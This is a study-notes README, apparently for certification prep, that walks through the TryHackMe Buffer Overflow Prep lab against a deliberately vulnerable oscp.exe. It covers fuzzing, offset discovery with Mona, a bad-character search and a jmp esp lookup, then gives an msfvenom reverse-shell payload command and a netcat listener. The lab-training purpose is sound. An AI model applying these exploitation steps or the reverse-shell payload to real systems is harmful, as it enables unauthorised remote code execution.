# Skeletons
Example based BOF "format"

- Table of Content
  * [Summary](#summary)
      - [Phase 1 (Recon)](#phase-1--recon-)
      - [Phase 2 (Overflow)](#phase-2--overflow-)
      - [Phase 3 (Exploit)](#phase-3--exploit-)
- [Buffer Overflow Prep (Full Explanation)](#buffer-overflow-prep--full-explanation-)
  * [Phase 1 Recon Phase](#phase-1-recon-phase)
    + [1. Load vulnerable app into Immunity Debugger that has Mona installed.](#1-load-vulnerable-app-into-immunity-debugger-that-has-mona-installed)
    + [2. Configure Mona](#2-configure-mona)
    + [3. Run the app in Immunity Debugger](#3-run-the-app-in-immunity-debugger)
    + [4. Testing the input](#4-testing-the-input)
  * [Phase 2 Overflow Phase](#phase-2-overflow-phase)
    + [1. Fuzzing](#1-fuzzing)
    + [2. Finding Exact Offset that caused the crash](#2-finding-exact-offset-that-caused-the-crash)
  * [Phase 3 Exploit Phase](#phase-3-exploit-phase)
    + [1. Finding Bad Characters](#1-finding-bad-characters)
    + [2. Finding Jump Points](#2-finding-jump-points)
    + [3. Generating Payload](#3-generating-payload)
    + [4. Exploit](#4-exploit)
  * [References :](#references--)

## Summary
#### Phase 1 (Recon)
1. **Set mona on Immunity** : `!mona config -set workingfolder c:\mona\%p`
2. **Connect to Application to check inputs** : `nc <server ip> 1337`

#### Phase 2 (Overflow)
1. **Edit Fuzzer.py script** : `IP address` and `port number(if applicable)`
2. **Run Fuzzer Script** : `python3 Fuzzer.py`
3. **Create Overflow Pattern** : `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number of bytes + 400>`
4. **Edit Exploit.py script** : `payload` variable with Overflow Pattern above, `IP address` and `Prefix` variables \
------------------***After Exploit.py Executed***------------------
5. **Find EIP Offset** : `!mona findmsp -distance <payload size>` 

#### Phase 3 (Exploit)
1. **Edit Exploit.py script** : `offset` and `retn` variables
2. **Generate Mona Bytearray** : `!mona bytearray -b "\x00"` 
3. **Generate for Exploit.py Script** : `python3 BadChar_Gen.py`
4. **Edit Exploit.py Script** : `Payload` variable \
------------------***After Exploit.py Executed***------------------
5.  **Find Bad Char** : `!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>`
6. **Repeat 1 - 5 until no Bad Char**
7. **Find Jmp Point** : `!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"` 
8. **Generate Exploit Payload** : `msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "\x00" -f c`
9. **Update Exploit.py** : `retn`, `payload` and `padding` variables 
10. **Start Listener and Run Script** : `nc -l -p 4444` and `python3 Exploit.py`

# Buffer Overflow Prep (Full Explanation)
## Phase 1 Recon Phase
### 1. Load vulnerable app into Immunity Debugger that has Mona installed.
### 2. Configure Mona
   * We will need to Configure Mona in Immunity Debugger for the commands below to work.\
   ![Image of ImmunityDBG](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/ImmunityDebugger_Blank.JPG)
   * At the bottommost of the screen, there is a textbox that accepts input. In the textbox, we type the follwing code: `!mona config -set workingfolder c:\mona\%p`

### 3. Run the app in Immunity Debugger

### 4. Testing the input 
   - We will connect to the application using `nc <server ip> 1337`
   - In this case, the exe file "*oscp.exe*" is a "*server*" application that accepts the following inputs (shown in picture below)\
    ![Image of oscpCMD](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/oscp_exe_validCmd.JPG)
   * Hence the value to be *overflow-ed* will be what comes after OVERFLOW(X). <br /> Below is a succesful run of the application\
   ![Image of No Overflow](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/oscp_exe_noBOF.JPG)
   
## Phase 2 Overflow Phase
### 1. Fuzzing
   * Change the script "*Fuzzer.py*" that is in the repo accordingly and run to find out an approximate number of bytes that can cause a crash.\
   ![Fuzzing Image](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/Fuzzer_py.JPG)
   ###### * There was an error in this image, the correct number of bytes is 1300 
### 2. Finding Exact Offset that caused the crash
   * Based on the above result, we determined that the upper limit of the offset is 1300 bytes
   * We will need to narrow down to the exact offset and this can be done as follows:\
    a. On Kali machine run `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number of bytes + 400>`\
    ![cyclic_pattern_gen](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/cyclic_pattern_gen.JPG)\
    b. Output generated will be similar to the above image, copy and paste it into the `payload` variable of "*exploit.py*" that is included in this repo.\
    c. Additonally, change the other variables like "***ip =***" and "***prefix =***" accordingly.\
    d. Run the exploit `python3 exploit.py` and expect "***oscp.exe***" to crash.\
   
   * Now go to Immunity Debugger and run `!mona findmsp -distance <payload size>`
   ![mona_findmsp_out](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/mona_findmsp_out.JPG)
   * Lookout for `EIP contains normal pattern : ... (offset xxxx)`
   * From the above, we can see that the offset is **1274**

## Phase 3 Exploit Phase
#### Before proceeding, we will need to update the *exploit.py* script with the information we gathered above and verify it.
   * update "***offset =***" variable to the offset found in the previous step
   * set "***retn =***" variable to "***BBBB***". 
   * Test the offset by running the exploit and we should see that ***EIP*** in Immunity Debugger shows "***42424242***" which is the hex value of "***B***"

### 1. Finding Bad Characters 
   i. Generate a bytarray of ***\x01*** to ***\xff*** that excludes nullbyte(***\x00***) with the code below.\
   `!mona bytearray -b "\x00"`\
   ii. Using ***BadChar_Gen.py***, generate a string of bad characters that is identical to the bytearray\
   ![badChar_genOut](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/badChar_gen_out.JPG)\
   iii. Update the exploit.py script by setting the payload to the bad characters generated by ***BadChar_Gen.py***\
   iv. Run the exploit script and the app should crash\
   v On Immunity Debugger take note of the ESP address and key the following command:\
   `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`\
   #### The following screen (Log Data) should appear
   ![cmp_bytearray_out](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/compare_bytearray_cmd_out.JPG)\
   #### The window above shows the results of the comparison between bytearray and the characters in the memory address to indicate differences in the characters within the memory address and bytearray.
   #### Some bad characters might be cause the next byte to be "corrupted" 
   vi. We will need to repeat step **i.** to **v.** until the command shows the output below: \
   ![cmp_bytearray_right](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/compare_bytearray_cmd_out_correct.JPG)
   
### 2. Finding Jump Points
* Once all the bad characters have been found, we can now proceed to finding the jump point.
* With mona in whichever state it is, run the following command with all the badchars identified:
`!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee" `
* The picture below will be displayed :\
![jmp_point_out](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/jmp_point_out.JPG) 
* As can be seen above, this command finds all "**jmp esp**" instructions with addresses that don't contain any of the badchars specified. The results is displayed in the (***Log data***) window.
* Choose an address and update the exploit.py script seting the `retn` variable in little endian format.  

### 3. Generating Payload
* Run the command below within the Kali Machine to generate a shellcode.
`msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "\x00" -f c`
* The above shellcode is to be inputted into the `payload` variable of the ***exploit.py*** script
* As the "***Shikata Ga Nai***" encoder was used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the `padding` variable to a string of 16 or more "***No Operation***" (\x90) bytes. 
### 4. Exploit
* Start a netcat listener on the kali box with the LPORT specified i.e 4444 as below : \
`nc -l -p 4444 `
* Restart and Run oscp.exe on Immunity and Run ***exploit.py***
* You should see something similar to the screen below : \
![exploit_success](https://github.com/irboi746/eCPPTv2-notes/blob/main/images/Exploit_Success.JPG) 


## References :  
1. https://tryhackme.com/room/bufferoverflowprep 
